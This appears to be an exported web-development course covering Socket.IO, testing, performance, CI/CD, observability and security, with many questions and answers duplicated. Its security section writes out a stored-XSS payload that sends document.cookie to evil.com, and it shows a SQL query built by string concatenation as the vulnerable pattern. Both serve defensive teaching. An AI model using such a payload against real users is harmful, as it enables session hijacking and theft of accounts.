items.title: Prove you understood it
items.body: A user is watching their order on the /orders/:id page. The admin updates the order status to "ready". How does the update reach the user's browser? The admin sends a PATCH /orders/:id request to your server. The server updates the database. Then the server calls io.to(`order:${orderId}`).emit('orderUpdated', { status: 'ready' }). The user's browser, when it loaded the order page, ran socket.join(`order:${orderId}`) (via a socket.emit to the server asking to join that room). The server called socket.join on their behalf. Now when the server emits to that room, the user's browser receives the event and updates the UI without a page reload.

mastery_questions: A user is watching their order on the /orders/:id page. The admin updates the order status to "ready". How does the update reach the user's browser? The admin sends a PATCH /orders/:id request to your server. The server updates the database. Then the server calls io.to(`order:${orderId}`).emit('orderUpdated', { status: 'ready' }). The user's browser, when it loaded the order page, ran socket.join(`order:${orderId}`) (via a socket.emit to the server asking to join that room). The server called socket.join on their behalf. Now when the server emits to that room, the user's browser receives the event and updates the UI without a page reload.

Your WebSocket server is running and clients are connecting. After 30 seconds, connections start dropping. What are the likely causes? Network proxies and load balancers close idle connections. The fix is heartbeating: Socket.IO's ping/pong mechanism (pingInterval, pingTimeout config) keeps the connection alive. Also check for NGINX proxy_read_timeout — if the proxy timeout is shorter than the ping interval, NGINX closes the connection before the ping keeps it alive. Set proxy_read_timeout 3600 in your NGINX config for WebSocket routes.

You have a collaborative document editor. Two users edit the same word simultaneously and both save. How do you handle this? This is a conflict detection problem. The naive approach is last-write-wins: whoever saves last overwrites. For simple cases this is acceptable. For real collaboration you need Operational Transformation (OT) or Conflict-free Replicated Data Types (CRDTs). Libraries like Yjs implement CRDTs and integrate with Socket.IO — they merge concurrent edits automatically. Understanding the full complexity of distributed state is a foundational knowledge gap for most developers.

What is the difference between socket.emit and socket.broadcast.emit and io.emit? socket.emit sends to the specific socket (one client). socket.broadcast.emit sends to all connected clients except the socket that triggered it (useful for "user X is typing" — you don't send it back to the typer). io.emit sends to all connected clients including the sender. io.to(room).emit sends to all sockets in a specific room. These are the four patterns you will use most.
ai_assist: "Write the Socket.IO server setup in Node.js/Express that: attaches to the HTTP server, validates the session in connection middleware (rejecting unauthenticated connections), and handles clients joining order rooms. On join, the client sends { orderId } and the server calls socket.join(`order:${orderId}`)."

"Write the client-side Socket.IO code in React that connects to the server, joins the order room for a specific orderId, listens for orderUpdated events, and updates the component state. Include cleanup: leave the room and disconnect when the component unmounts."
"Explain how Socket.IO rooms work and write an example of a chat room implementation with join, leave, message broadcast, and a user list that updates when someone joins or leaves."
weeks.pre_flight: Install Socket.IO: npm i socket.io socket.io-client. Read the Socket.IO server documentation for Node.js. Understand the event-emitter pattern: on(event, callback) listens; emit(event, data) sends. Know the difference between socket.emit (to one client), io.to(room).emit (to all in a room), and io.emit (to all connected clients). Install the Redis adapter if you plan to scale: npm i @socket.io/redis-adapter ioredis.
common_mistakes: Not handling disconnections. Clients disconnect — network drops, browser closes, mobile goes to background. Your server must handle the 'disconnect' event and clean up any state associated with that socket (remove from user presence lists, cancel pending operations).

Trusting data from WebSocket messages without validation. Apply the same input validation to WebSocket messages as to HTTP requests. A malicious client can emit any event with any payload. Use zod to validate socket message payloads.

Not authenticating WebSocket connections. The HTTP handshake carries cookies, so session-based auth works — validate the session in the Socket.IO middleware before allowing the connection. For token-based auth, pass the token in the handshake auth object and validate it in middleware.

Emitting events inside a loop for each client instead of using rooms. socket.emit in a loop with 1000 connections is 1000 separate emit calls. io.to(room).emit is one operation that distributes internally. Learn the room and broadcast patterns.

Using WebSockets when SSE is sufficient. If you only need server-to-client updates (notifications, live dashboards), SSE is simpler and works over standard HTTP. WebSockets add complexity that is only justified when you need bidirectional communication.
weeks.debug_help: "WebSocket connection failed" in browser console: check CORS configuration on the Socket.IO server. The origin option must include your frontend URL. In development, you can use cors: { origin: "*" } but restrict this in production. Connection established but events are not received: verify the event name matches exactly on both sides — 'orderUpdated' on the server must match 'orderUpdated' on the client. Casing matters. Sockets disconnect immediately after connecting: check if an error is thrown in the Socket.IO middleware (e.g., authentication failure). Log errors in the connection middleware. Redis adapter not syncing between server instances: verify the Redis connection is working (connect to Redis with ioredis and run PING). Check that both server instances use the same Redis URL.

Replace the Socket.IO order updates with Server-Sent Events. Implement the SSE endpoint in Express (res.setHeader('Content-Type', 'text/event-stream'), write data: ... 

 frames). Compare the complexity and resource usage with Socket.IO.

Add the Socket.IO Redis adapter and run two Node.js server instances locally (different ports, behind a simple load balancer like nginx). Verify that a client connected to server 1 receives events emitted from server 2.

weeks.title: Testing — Unit, Integration, E2E
weeks.context:
Testing is how you change code without being afraid. An untested codebase is one where every change might break something that worked before, and the only way to know is to manually click through every feature after every change. Tests make refactoring possible, make onboarding new developers faster, and make sleeping better.

Three types of tests, from fastest to slowest and from cheapest to most expensive. Unit tests verify a single function in isolation. They mock all dependencies. They run in milliseconds. Write them for pure business logic: price calculations, data transformations, validation functions. Unit tests cannot tell you that the system works end-to-end. Integration tests verify that multiple units work together — your API route calling the database, your authentication middleware rejecting unauthorised requests. They use a real (or in-memory) database. They run in seconds. Write them for your API endpoints. They give the most confidence per test written. End-to-end (E2E) tests run a real browser and simulate user interactions. They test the full stack: frontend, backend, database. They run in minutes. Write them for critical user journeys: sign up, login, place an order, subscribe.

Vitest is the test runner for modern TypeScript projects (faster than Jest, better TypeScript support, same API). Supertest is a library for testing Express HTTP endpoints without starting a real server. Playwright is the standard for E2E browser testing.

Testing culture: tests are not just for finding bugs after the fact. Writing the test first (TDD) forces you to think about the interface before the implementation — it often leads to better-designed functions. At minimum, write tests before you fix bugs (the test proves the bug exists, then the fix makes it pass, and the test ensures the bug never comes back).

This week you write unit tests for the pricing logic in Bean Forge, integration tests for the auth and orders API endpoints using a test database, and E2E tests for the signup and checkout flows using Playwright.

items.title: Prove you understood it
items.body: You have a function calculateOrderTotal(items, discountCode) that applies a discount if the code is valid. How do you unit test this? You do not need a database or a server — create test cases with plain JavaScript objects. Test the happy path: valid items and a valid discount code returns the correct total. Test edge cases: empty items array returns 0, invalid discount code is ignored (or throws, depending on your design), items with 0 quantity are excluded, negative prices are rejected. Each test creates the input, calls the function, and asserts the output. No mocking required — the function takes plain data in and returns plain data out.

mastery_questions: You have a function calculateOrderTotal(items, discountCode) that applies a discount if the code is valid. How do you unit test this? You do not need a database or a server — create test cases with plain JavaScript objects. Test the happy path: valid items and a valid discount code returns the correct total. Test edge cases: empty items array returns 0, invalid discount code is ignored (or throws, depending on your design), items with 0 quantity are excluded, negative prices are rejected. Each test creates the input, calls the function, and asserts the output. No mocking required — the function takes plain data in and returns plain data out.

You want to test your POST /auth/login endpoint. It reads from the database. How do you set this up without messing up your development database? Create a separate test database (a real PostgreSQL database for integration tests, or use prisma.$connect with a SQLite in-memory database). Before each test run, reset the database to a known state: run prisma migrate reset --force --skip-seed then seed specific test data. In your test, create a user with a known email and password, call POST /auth/login with those credentials, and assert the response is 200 with a session cookie. After the test, the database is reset for the next test.

A Playwright test clicks "Sign Up", fills in the form, submits, and is supposed to land on the dashboard. The test fails intermittently — sometimes it passes, sometimes it fails. What is the likely cause? Race conditions: the test is clicking/asserting before the async operation completes. Playwright's auto-wait helps but is not magic. Common causes: not waiting for the network request to complete before asserting UI changes, animation delays preventing clicks, slow CI environment making timeouts fire too early. Fix: use await page.waitForURL('/dashboard') instead of assuming navigation is instant. Use await expect(page.getByRole('heading', { name: 'Dashboard' })).toBeVisible() which retries until visible. Avoid arbitrary await page.waitForTimeout(1000) — it is brittle.

Your test suite takes 8 minutes to run. How do you identify and fix slow tests? Profile: run vitest --reporter=verbose and note which tests are slow. E2E tests in Playwright should run in parallel (use workers in playwright.config.ts). Integration tests should use a transaction that is rolled back after each test instead of re-seeding the entire database — this is much faster. Unit tests should be sub-second — if a unit test is slow, it is probably doing I/O (calling the real database or making HTTP requests) which means it is not a unit test. Isolate I/O behind interfaces and mock them.

Set up a test database: create a separate PostgreSQL database (or use SQLite in-memory for unit/integration tests). Add a DATABASE_URL_TEST to your .env.test. common_mistakes: Testing implementation details instead of behaviour. Testing that a function called a specific internal method (spying on internals) means your tests break every time you refactor, even when the behaviour is unchanged. Test inputs and outputs, not the path taken internally.

Writing tests after the fact as an afterthought. Tests written after implementation tend to test the implementation, not the requirements. If a bug slips through, write the test first: prove the bug exists with a failing test, then fix it.

Sharing state between tests. Each test must set up and tear down its own state. If test A creates a user and test B assumes that user exists, tests become order-dependent and fail randomly when run in different orders. Use beforeEach to set up fresh state.

Not running tests in CI. If tests only run locally on the developer's machine, they are not really tests — they are optional suggestions. Every PR should run the test suite. A failing test blocks the merge.

100% code coverage as the goal. Coverage measures which lines ran, not whether the tests are good. You can achieve 100% coverage with useless assertions. Aim for test coverage of critical paths and business logic, not mechanical coverage of every line.
weeks.debug_help: Vitest cannot find the module: check tsconfig paths are configured in vitest.config.ts using the vite-tsconfig-paths plugin. Supertest returns 404 for an endpoint that exists: make sure you are exporting the Express app (not calling app.listen) and importing it in the test. The listen call starts the server on a port — Supertest creates its own test server. Playwright cannot find elements: use the Playwright inspector (PWDEBUG=1 npx playwright test) to pause and inspect the page. Selectors that work in the browser may differ from what Playwright finds — prefer role-based selectors (getByRole, getByLabel) over CSS selectors. Tests pass locally but fail in CI: check whether tests depend on local environment variables not set in CI, whether the test database is accessible in CI, and whether the time zone difference affects date-based assertions.

Set up a GitHub Actions CI workflow that runs unit and integration tests on every PR, and E2E tests on merge to main. Cache the node_modules and Playwright browsers to speed up the runs.

weeks.title: Performance — Web Vitals and Bundle Size
weeks.context:
Performance is user experience. A page that takes 5 seconds to load loses users before they see the product. Core Web Vitals are Google's performance metrics and a ranking signal for search. The three that matter: Largest Contentful Paint (LCP) — how fast the main content appears; Cumulative Layout Shift (CLS) — how much the page jumps around while loading; Interaction to Next Paint (INP) — how fast the page responds to user interactions.

LCP targets: under 2.5 seconds is good, 2.5-4.0 seconds needs improvement, over 4.0 seconds is poor. The LCP element is usually the hero image or the main heading. Optimise it by: preloading the LCP image (link rel="preload"), serving images in WebP or AVIF format, using a CDN so the image is served from an edge location close to the user, and using the Next.js Image component which does all of this.

Bundle size is the other major performance lever. Every kilobyte of JavaScript downloaded, parsed, and executed delays interactivity. Your users on slow connections pay for every unused import. Measure bundle size with next build (it shows route bundle sizes) and the next-bundle-analyzer package. Common problems: importing an entire utility library when you only need one function (import { format } from 'date-fns' is fine; import _ from 'lodash' pulls in 70KB), not code-splitting large components (dynamic imports load them lazily), shipping polyfills for browsers you do not support.

Server components in Next.js App Router are a performance win: they render on the server and ship zero JavaScript to the browser. Use server components for anything that does not require interactivity (fetching data, static content). Move interactivity down to leaf components that can be marked 'use client'. This "islands architecture" minimises client-side JavaScript.

Caching is the most impactful optimisation. Next.js caches at multiple levels: build-time static generation (fastest), route-level caching with revalidate, and request memoization. Understand which cache is active for each page and when it is invalidated. Database query caching: use Redis or a query-level cache for expensive queries that do not need to be real-time. HTTP caching: set Cache-Control headers correctly so browsers and CDNs cache static assets.

items.title: Prove you understood it
items.body: Your LCP score is 4.2 seconds. The LCP element is the hero image on the homepage. What specific changes do you make to fix it? Convert the image to WebP (50-80% smaller than JPEG). Add a preload link in the head: <link rel="preload" as="image" href="/hero.webp">. This tells the browser to start downloading the image as soon as the HTML is parsed, instead of waiting until the CSS and render tree are processed. Use the Next.js Image component with priority={true} for the hero — it sets the preload automatically. Move the image to a CDN. The first two changes alone typically drop LCP by 1-2 seconds.

mastery_questions: Your LCP score is 4.2 seconds. The LCP element is the hero image on the homepage. What specific changes do you make to fix it? Convert the image to WebP (50-80% smaller than JPEG). Add a preload link in the head: <link rel="preload" as="image" href="/hero.webp">. This tells the browser to start downloading the image as soon as the HTML is parsed, instead of waiting until the CSS and render tree are processed. Use the Next.js Image component with priority={true} for the hero — it sets the preload automatically. Move the image to a CDN. The first two changes alone typically drop LCP by 1-2 seconds.

Your next build output shows that the /checkout route has a 450KB JavaScript bundle. How do you investigate and reduce it? Run next build with the bundle analyzer (ANALYZE=true next build). Look at the treemap — which package is the largest? Common culprits: moment.js (replace with date-fns), lodash (import only the functions you use), a PDF library loaded at page level (dynamic import it only when the user requests a PDF). Apply dynamic imports for heavy components: const PDFViewer = dynamic(() => import('./PDFViewer'), { loading: () => <Spinner /> }). After changes, run the analyzer again to verify the reduction.

A page fetches user data that changes at most once per hour. How do you cache this in Next.js App Router to avoid hitting the database on every request? In App Router, data fetching in server components uses the fetch API with revalidate: fetch('/api/user', { next: { revalidate: 3600 } }) — this caches the response for one hour. For Prisma queries (not fetch), use unstable_cache from next/cache: const getCachedUser = unstable_cache(async (id) => prisma.user.findUnique({ where: { id } }), ['user'], { revalidate: 3600 }). When the user changes their data, call revalidateTag or revalidatePath to bust the cache immediately.

Your page has a CLS score of 0.25 (poor). What causes CLS and how do you diagnose it? CLS occurs when content shifts after initial render — an image loads and pushes text down, a font loads and changes letter spacing, an ad injects into the layout. Diagnose in Chrome DevTools: open Performance tab, record a page load, look for layout shift events. Common fixes: always set explicit width and height on images (the browser reserves space before loading). Use font-display: optional or font-display: swap with size-adjust to minimise font-related shifts. Reserve space for dynamic content (ads, embeds) with min-height.

common_mistakes: Using the tag instead of Next.js Image for large images. The Image component handles format optimisation, sizing, lazy loading, and LCP preloading automatically. For the LCP image, add priority={true}.
Importing entire libraries when you need one function. import moment from 'moment' pulls in the full 67KB library. import { format } from 'date-fns' pulls in only that function. Audit your imports.

Not setting explicit dimensions on images. Without width and height, the browser does not know how much space to reserve, causing layout shift when the image loads. Always set dimensions or use the fill prop with a sized container.

Blocking the main thread with synchronous JavaScript. Long-running JavaScript (loops, complex calculations) blocks rendering and interactivity. Move heavy computation to Web Workers or break it into chunks with requestIdleCallback.

Over-fetching data in server components. Fetching the entire user object when you only need the name adds unnecessary database query time and serialisation cost. Select only the fields you need: prisma.user.findUnique({ where: { id }, select: { name: true } }).
weeks.debug_help: Lighthouse score is good locally but poor in production: you are probably testing on your fast machine with a fast connection. Lighthouse has a "Mobile" throttled mode that simulates a slower device and 4G connection — use this for realistic scores. Run Lighthouse on the production URL (after deploying), not localhost. Bundle analyzer shows a large chunk for a module you thought you removed: check for indirect imports — some package you are using may import it. Run npx depcheck to find unused dependencies. CLS is 0 in development but non-zero in production: production may use a CDN with different caching, fonts load differently, or image CDN is slower. Test with Cache-Control: no-cache to bypass CDN caching and reproduce the issue locally.
stretch: Implement streaming with Suspense in Next.js. Wrap slow data-fetching server components in <Suspense fallback={<Skeleton />}>. The page HTML streams progressively — fast content reaches the browser first, slow content follows when ready. Measure the improvement in Time to First Byte and LCP.
Add a service worker for offline support and caching using next-pwa. Cache the homepage and menu page so Bean Forge works offline. Test by opening DevTools > Network > Offline mode.

Run a performance audit on your database queries. Install the Prisma query log (log: ['query']) and look for N+1 queries (fetching related data in a loop). Fix them with include or with query batching. Measure the reduction in response time.

weeks.title: CI/CD and Deploy — Shipping on Every Merge
weeks.context:
Continuous Integration and Continuous Deployment (CI/CD) is the practice of automatically running tests and deploying code on every change. The goal: changes go from your editor to users in production with confidence, in minutes, without manual steps. This week you set up the pipeline that will govern every future change to Bean Forge.

CI (Continuous Integration): every push to the repository triggers an automated pipeline that installs dependencies, runs linting, runs the type checker, runs the test suite, and builds the application. If any of these fail, the pipeline fails and the change is blocked from merging. The point is that you find out within 5 minutes of pushing whether your change is broken — not 2 days later when someone complains.

CD (Continuous Deployment): after CI passes on the main branch, the pipeline automatically deploys to production. For staging environments, deploy on every merge to main. For production, some teams add a manual approval step. With Vercel or Railway, deployment is a single command or a git push — these platforms handle building and serving.

GitHub Actions is the standard CI system for GitHub repositories. A workflow is a YAML file in .github/workflows/ that defines jobs (groups of steps) triggered by events (push, pull_request, schedule). Each job runs on a fresh virtual machine (runner). Steps are shell commands or pre-built actions from the Actions Marketplace.

Environments and secrets: production credentials (DATABASE_URL, STRIPE_SECRET_KEY, etc.) must not be in your code. GitHub Actions provides encrypted secrets that you set in the repository settings and reference in workflows as ${{ secrets.SECRET_NAME }}. Set up separate secrets for staging and production environments.

Preview deployments: Vercel and Railway can deploy every pull request to a unique preview URL. This means stakeholders can review changes on a live URL before they merge to main. Each preview has its own environment variables (connected to the staging database, not production).

AWS / GCP / Azure — when (and when not) to use cloud-of-the-three

Secrets management — env vars, Vault, AWS Secrets Manager, Doppler

items.title: Prove you understood it
items.body: You push a commit with a bug. The CI pipeline catches it and fails. How should the pipeline be configured so that a broken main branch cannot happen? Enforce branch protection rules on main: require at least one CI workflow to pass before merging, require pull request reviews, do not allow direct pushes to main. Every change goes through a PR. The CI runs on the PR. Only after CI passes and a reviewer approves can the PR merge. The merge triggers the CD deploy. This means main is always deployable.

mastery_questions: You push a commit with a bug. The CI pipeline catches it and fails. How should the pipeline be configured so that a broken main branch cannot happen? Enforce branch protection rules on main: require at least one CI workflow to pass before merging, require pull request reviews, do not allow direct pushes to main. Every change goes through a PR. The CI runs on the PR. Only after CI passes and a reviewer approves can the PR merge. The merge triggers the CD deploy. This means main is always deployable.

Your GitHub Actions workflow runs npm install on every job run. This takes 45 seconds. How do you speed it up? Cache node_modules between runs using the actions/cache action. The cache key is based on the hash of package-lock.json — if the lockfile does not change, the cache is restored and npm install is skipped. Using actions/setup-node with cache: 'npm' does this automatically. Also use npm ci instead of npm install — it is faster because it installs directly from package-lock.json without resolving.

You have a workflow that runs tests, then deploys. A developer pushes 3 commits in quick succession. What happens if the deploy from the first commit is still running when the second commit triggers a new deploy? Both pipelines run in parallel — the second deploy may finish first (because the first's tests were slower), meaning the older code ends up in production. Fix with concurrency groups: concurrency: { group: production-deploy, cancel-in-progress: true }. This cancels the in-flight deploy when a new one starts, ensuring only the latest commit deploys.

How do you verify that your deployment actually works after deploying, not just that the CI tests passed? Add a smoke test step after deploy: a simple curl or a Playwright test that hits the production URL and checks the response. If the smoke test fails (the app is crashing in production), trigger a rollback. Vercel supports instant rollback to a previous deployment. Railway has a similar rollback mechanism. A smoke test catches cases where something works in CI but fails in production (environment variable not set, database migration not run, etc.).
ai_assist: "Write a GitHub Actions workflow for a Next.js app that: triggers on push to main and on pull requests, runs on ubuntu-latest, caches node_modules using actions/setup-node cache, runs npm ci then next build then vitest --run, and on push to main only deploys to Vercel using the Vercel CLI."
"Explain zero-downtime database migrations for a PostgreSQL database with Prisma. I'm adding a NOT NULL column to a table with 500k rows. What sequence of migrations and deployments do I follow?"
"Write a GitHub Actions concurrency configuration for a deployment workflow that cancels in-progress deployments when a newer commit is pushed, but does not cancel CI test runs."
weeks.pre_flight: Have a GitHub repository for Bean Forge with your code pushed to it. Create a Vercel account and connect it to your GitHub repository. Vercel's GitHub integration automatically creates preview deployments for pull requests and production deployments for main branch merges. Read the GitHub Actions quickstart guide. Understand YAML syntax: indentation is significant, lists use hyphens, key-value pairs use colons.
common_mistakes: Committing secrets to the repository. Even if you delete them later, they are in git history. Use GitHub Secrets for CI credentials, and .env files (excluded from git via .gitignore) for local development.

Running database migrations automatically in the deploy step without a migration plan. If a migration is destructive (drops a column) and the new code deploys before the migration runs, or vice versa, you get downtime or data loss. Plan zero-downtime migrations: add new columns before deploying new code that reads them, remove old columns after the old code no longer uses them.
Not caching dependencies in CI. Running npm install from scratch on every pipeline run adds 30-90 seconds per run. Multiply by 50 PRs per week and you are wasting hours of CI minutes.

Deploying directly from the CI runner with long-lived credentials. Prefer using the deployment platform's GitHub integration (Vercel GitHub app, Railway GitHub integration) which uses short-lived tokens and integrates with branch protection. Do not store Vercel API tokens in GitHub Secrets if Vercel's native integration handles it.
Not setting up preview deployments. Without preview deployments, reviewers have to check out the branch and run it locally to see UI changes. Vercel and Railway do this for free — set it up.
weeks.debug_help: GitHub Actions workflow does not trigger: check the on: block in the YAML — the branch name must match exactly (main vs master) and the event must match the action (push vs pull_request). Validate your YAML with the GitHub Actions linter (the Actions tab shows errors). Workflow runs but fails with "Command not found": the runner does not have the tool installed. Use an action like actions/setup-node before running npm commands. Environment variables not available in the workflow: if using GitHub Environments, the environment name in the job (environment: production) must match the environment created in repo Settings > Environments. Deployment succeeds in CI but app crashes in production: add a smoke test step and check the production logs immediately after deploy. Common cause: missing environment variable in the production environment.
stretch: Add a release workflow that creates a GitHub Release on every merge to main. Use semantic versioning based on commit message conventions (conventional commits): feat: triggers minor version bump, fix: triggers patch bump, feat!: triggers major bump. The semantic-release package automates this.

Set up a staging environment separate from production. Main branch deploys to staging automatically. Production deployment requires a manual trigger (a workflow_dispatch event or a tag push). This gives you a place to test with real data before it goes to users.

Add a dependency audit step to CI: npm audit --audit-level=high fails the build if any high-severity vulnerabilities are found in dependencies. Set up Dependabot to automatically open PRs for dependency updates.

weeks.title: Observability — Logs, Metrics, Traces in Production
weeks.context:
Production is different from your laptop. On your laptop, you know when something breaks because you are watching the terminal. In production, users run into bugs while you are asleep, and unless you have instrumented your application, you find out from a support email two days later. Observability is the practice of making your system's internal state visible from its external outputs.

Three pillars of observability. Logs are timestamped records of events: a user logged in, an order was placed, an error occurred. Structured logs (JSON format) are machine-readable and can be queried. Unstructured logs (plain text sentences) are human-readable but hard to search at scale. Use structured logging. Metrics are numeric measurements aggregated over time: requests per second, error rate, database query latency, memory usage. They tell you the system is unhealthy. Logs tell you why. Traces are end-to-end records of a request as it flows through multiple services. They show you which part of a distributed system is slow.

Error tracking is the highest-ROI observability investment for a single-service application. Sentry captures unhandled exceptions, attaches the stack trace, the user's session, the browser/OS, and groups duplicate errors together. Without Sentry, a bug that affects 1000 users generates 1000 separate error reports (or none, if users just leave without reporting). With Sentry, it is one issue with a count of 1000.

Uptime monitoring checks your application from the outside at regular intervals and alerts you if it is down. Services like Better Uptime, UptimeRobot, or Checkly ping your health check endpoint every minute. Your health check endpoint should verify the database connection and any critical dependencies, not just return 200.

Logging in Node.js: use Pino (fast, structured JSON logging) or Winston. In development, pretty-print with human-readable format. In production, output raw JSON so log aggregation services (Datadog, Logtail, Papertrail) can parse it.

items.body: Your health check endpoint at /api/health returns 200. An uptime monitor pings it and reports your site is up. But users are getting "Internal Server Error" on checkout. How does this happen and how do you fix it? The health check only checked the HTTP server, not the database connection. If the database is down or out of connections, the health check passes but data operations fail. Fix: the health check must verify all critical dependencies. For the database: await prisma.$queryRaw`SELECT 1`. For Redis: await redis.ping(). If any check fails, return 503 Service Unavailable. Now your uptime monitor detects the real failure.

mastery_questions: Your health check endpoint at /api/health returns 200. An uptime monitor pings it and reports your site is up. But users are getting "Internal Server Error" on checkout. How does this happen and how do you fix it? The health check only checked the HTTP server, not the database connection. If the database is down or out of connections, the health check passes but data operations fail. Fix: the health check must verify all critical dependencies. For the database: await prisma.$queryRaw`SELECT 1`. For Redis: await redis.ping(). If any check fails, return 503 Service Unavailable. Now your uptime monitor detects the real failure.

Sentry groups multiple occurrences of the same error into one issue. What determines if two errors are the "same" issue? Sentry uses the error fingerprint: a combination of the error message, exception type, and stack trace. Two occurrences with the same stack trace are grouped together. You can customise the fingerprint if the default grouping is too coarse (one issue per error type) or too fine (one issue per URL parameter). For example, a database connection error at the same code location should always be one issue, regardless of the specific SQL query.

You want to trace a slow API request end-to-end: how long does each phase take? The request comes in, then authentication middleware, then a database query, then a third-party API call, then the response. How do you measure each phase? Use distributed tracing. Sentry's performance monitoring or OpenTelemetry wraps each phase in a span. Each span has a name, a start time, and a duration. The trace shows them as a waterfall — you can see that the database query took 800ms and the third-party API took 2 seconds. Without tracing, you only know the total request time.

You have structured logs in production. A user reports an error that happened 3 days ago. How do you investigate it using logs? With structured JSON logs in a log aggregation service (Datadog, Logtail), you can filter by time range, userId, requestId, or error level. Query: timestamp:[3 days ago] AND userId:abc123 AND level:error. If you logged a correlationId on every request and attached it to every log line in that request's lifecycle, you can trace all log lines from one request: requestId:xyz789. This is why request correlation IDs and structured logging matter — they make post-mortem investigation possible.

"Write a health check Express route at GET /api/health that checks: PostgreSQL database (run a SELECT 1 query), Redis connection (run PING), and disk space. Return 200 with a JSON status object if all pass, 503 if any fail. Include response time for each check."

weeks.pre_flight: Create a Sentry account at sentry.io. Create a new project for Node.js (for your Express API) and a new project for Next.js (for your frontend). Install the Sentry SDK: npm i @sentry/node (backend) and npm i @sentry/nextjs (frontend). Run the Sentry Next.js wizard: npx @sentry/wizard@latest -i nextjs. Install Pino: npm i pino pino-pretty. Set up Better Uptime (betteruptime.com) with a free account — add your production URL as a monitor.
common_mistakes: console.log for production logging. console.log output is unstructured text, not indexed, and goes to stdout where it may be discarded. Use Pino or Winston for structured JSON logging that log aggregation services can parse and index.

Logging sensitive data. Never log passwords, tokens, credit card numbers, or PII in log messages. Review what your error tracking and logging tools capture — Sentry scrubs common patterns but you must configure it for your specific sensitive fields.

Not using a request correlation ID. Without a correlation ID attached to every log line in a request, you cannot reconstruct what happened during one request when logs from multiple concurrent requests are interleaved.

Alert fatigue from low-threshold alerts. If your uptime monitor sends an alert for any 5-second blip in response time, you train yourself to ignore alerts. Set alert thresholds that reflect real user impact. Alert on the 95th percentile latency, not the average.

Not testing your alerts. An alert that never fires might be misconfigured. Test your Sentry integration by deliberately throwing an unhandled error. Test your uptime monitor by taking the health check down temporarily.
weeks.debug_help: Sentry is not capturing errors: verify the SENTRY_DSN is set in your production environment variables. Call Sentry.captureException(new Error('test')) in a route to verify the SDK is initialised and sending. Pino logs are not appearing in your log aggregation service: check that the service is reading from stdout and that your deployment platform pipes stdout to the service. Railway and Heroku capture stdout by default. Vercel functions only log during execution — cold start logs may not appear. Health check is returning 503 in production: your database check is failing. Log the specific error from prisma.$queryRaw to see why. Common cause: database connection limit exceeded (too many serverless functions opening connections) — add a connection pool like Prisma Accelerate or PgBouncer.
stretch: Set up OpenTelemetry tracing for your Express API. Instrument the database layer (Prisma), HTTP client calls, and custom business logic spans. Export traces to Jaeger (run it locally with Docker) and view the trace waterfall for a checkout request.

Build a simple internal status page. A cron job (or GitHub Actions schedule) hits your health check endpoint every 5 minutes and writes the result (timestamp, status, latency) to a PostgreSQL table. A public Next.js page reads the last 90 days of data and shows uptime percentage and a response time chart.

Add alerting to Sentry: configure an alert rule that sends a Slack message when a new issue is created or when an existing issue exceeds 100 occurrences per hour. Set up a separate alert for any P1 error (tagged manually or by error type).

weeks.title: Security — The Threats You Haven't Thought About
weeks.context:
Security is not a checklist. Every application that handles user data or money has the same set of threats, and most breaches happen because of well-known, well-documented vulnerabilities that were not addressed. This week you learn the OWASP Top 10 and how each applies to Bean Forge.

SQL injection: user-controlled input is included directly in SQL queries, allowing the attacker to modify the query. Parameterised queries (which Prisma uses by default) prevent this entirely — the parameter value is never interpreted as SQL. The vulnerability is using raw string concatenation: db.query("SELECT * FROM users WHERE email = '" + email + "'"). Prisma's ORM layer means you are safe if you use the API correctly. Watch for prisma.$queryRaw — use template literal syntax where Prisma escapes the parameters, not string concatenation.

Cross-Site Scripting (XSS): an attacker injects malicious JavaScript into a page that other users view. In React, JSX automatically escapes text content — {userInput} is safe. The vulnerability is dangerouslySetInnerHTML or using the DOM API to set innerHTML directly. Never use dangerouslySetInnerHTML with user-supplied content unless you run it through a sanitisation library like DOMPurify first.

Cross-Site Request Forgery (CSRF): a malicious website tricks a user's browser into making authenticated requests to your application. Modern defences: SameSite=Strict or SameSite=Lax cookie attribute prevents the browser from including cookies on cross-site requests. The SameSite attribute is now the default in most browsers, making CSRF rare. Still, understand the attack.

Dependency vulnerabilities: your application is only as secure as its dependencies. Run npm audit regularly. Use automated tools (Dependabot, Snyk) to flag known CVEs in your dependency tree. Subscribe to security advisories for your major dependencies.

Security headers: a small middleware call that adds significant protection. Use the helmet package in Express: it sets Content-Security-Policy, X-Frame-Options (prevents clickjacking), Strict-Transport-Security (forces HTTPS), and other headers. In Next.js, configure security headers in next.config.ts.

Rate limiting: prevents brute-force attacks (trying millions of passwords), credential stuffing (using leaked credentials from other breaches), and scraping. Add rate limiting to authentication endpoints and any expensive endpoint.

Environment variables and secrets: never commit secrets to git. Use .env files locally (excluded via .gitignore) and environment variable management in production (Vercel env, Railway env, AWS Secrets Manager).
topics: OWASP Top 10 — the canonical risk list
Injection attacks — SQL, NoSQL, command, when ORMs save you
XSS — stored, reflected, DOM; React's default protections, where it leaks
CSRF — the same-origin policy, SameSite cookies, anti-CSRF tokens
Authentication and session attacks — fixation, hijacking, brute force
Authorisation bugs — IDOR (insecure direct object references), the most common bug class
Secrets in code — git history scanning, secret rotation
Dependency vulnerabilities — npm audit, Snyk, Dependabot

items.title: Prove you understood it
items.body: A user can set their display name. It is shown to other users on their profile page. Explain how a stored XSS attack would work and how React protects you. The attack: a malicious user sets their display name to <script>document.location='https://evil.com?cookie='+document.cookie</script>. If this string is rendered as HTML in another user's browser, the script executes and steals their cookies. React's protection: JSX escapes HTML entities before inserting into the DOM. The malicious name is rendered as the literal text "<script>..." — the browser sees a string, not a script tag. This protection applies when you use {user.displayName}. It does not apply if you use dangerouslySetInnerHTML={{__html: user.displayName}} — never do that with user content.

mastery_questions: A user can set their display name. It is shown to other users on their profile page. Explain how a stored XSS attack would work and how React protects you. The attack: a malicious user sets their display name to <script>document.location='https://evil.com?cookie='+document.cookie</script>. If this string is rendered as HTML in another user's browser, the script executes and steals their cookies. React's protection: JSX escapes HTML entities before inserting into the DOM. The malicious name is rendered as the literal text "<script>..." — the browser sees a string, not a script tag. This protection applies when you use {user.displayName}. It does not apply if you use dangerouslySetInnerHTML={{__html: user.displayName}} — never do that with user content.

Your login endpoint has no rate limiting. Describe the attack that is possible and what rate limiting prevents. A credential stuffing attack: the attacker has a list of 10 million email/password combinations leaked from another service. They make automated requests to your login endpoint, trying each pair. Without rate limiting, a bot can try thousands per second. With rate limiting (e.g., 5 attempts per IP per 15 minutes), the attacker would need years to try all combinations. Also implement account lockout after N failures per user account (not just per IP — attackers can rotate IPs).

